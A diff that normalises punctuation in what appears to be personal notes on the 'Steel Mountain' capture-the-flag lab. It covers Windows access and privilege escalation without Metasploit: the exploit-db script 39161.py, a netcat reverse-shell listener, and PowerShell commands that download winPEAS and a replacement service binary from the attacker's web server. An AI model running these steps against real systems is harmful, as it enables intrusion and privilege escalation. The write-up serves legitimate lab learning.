@@ -5,11 +5,11 @@ date:: 2021-11-08
 
 ## Steel Mountain
 
-Things got busy yesterday and I had to push finishing this section off a day. The machine’s new IP address is 10.10.174.199.
+Things got busy yesterday and I had to push finishing this section off a day. The machine's new IP address is 10.10.174.199.
 
 ### Access and Escalation Without Metasploit
 
-The alternate exploit we’re going to run for this is located at /usr/share/exploitdb/exploits/windows/remote/39161.py on Kali Linux. To set this up, we’re going to use a quick-n-dirty Python web server containing a statically-compiled version of netcat. This needs to be running on port 80 for the exploit to work (don’t forget to punch a hole through the firewall for this!).
+The alternate exploit we're going to run for this is located at /usr/share/exploitdb/exploits/windows/remote/39161.py on Kali Linux. To set this up, we're going to use a quick-n-dirty Python web server containing a statically-compiled version of netcat. This needs to be running on port 80 for the exploit to work (don't forget to punch a hole through the firewall for this!).
 
 ```bash
 mkdir 1
@@ -19,7 +19,7 @@ curl -O https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/wi
 sudo python3 -m http.server 80
 ```
 
-Ready our listener in another terminal. Note that WinPEAS generates *a lot* of output, so we need to increase TMUX history buffer (`set -g history-limit 8192`) in order to be able to capture all of it. This needs to be set *before* creating the window that we’re going to catch our reverse shell in!
+Ready our listener in another terminal. Note that WinPEAS generates *a lot* of output, so we need to increase TMUX history buffer (`set -g history-limit 8192`) in order to be able to capture all of it. This needs to be set *before* creating the window that we're going to catch our reverse shell in!
 
 ```bash
 nc -lvnp 4444
@@ -34,21 +34,21 @@ python2 39161.py 10.10.174.199 8080
 python2 39161.py 10.10.174.199 8080
 ```
 
-Once we’re in (the exploit needs to be run twice to work), we need to grab and run winPEASx64.exe from our web server.
+Once we're in (the exploit needs to be run twice to work), we need to grab and run winPEASx64.exe from our web server.
 
 ```powershell
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/winPEASx64.exe -OutFile winPEASx64.exe"
 .\winPEASx64.exe
 ```
 
-Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwrite, it looks like it misses the fact that the compromised user can restart it. That said, WinPEAS does display *a lot* more information than PowerUp, so it might be useful to run *both*…
+Interestingly, while WinPEAS notes that ASCServie.exe is vulnerable to an overwrite, it looks like it misses the fact that the compromised user can restart it. That said, WinPEAS does display *a lot* more information than PowerUp, so it might be useful to run *both*...
 
 Useful PowerShell commands:
 
-* `Get-Service` — list all services, or drill down on a particular service.
-* `sc stop $SERVICE`/`sc start $SERVICE` — stop/start $SERVICE.
+* `Get-Service` - list all services, or drill down on a particular service.
+* `sc stop $SERVICE`/`sc start $SERVICE` - stop/start $SERVICE.
 
-Putting this all together, we can replicate yesterday’s compromise by:
+Putting this all together, we can replicate yesterday's compromise by:
 
 ```powershell
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"
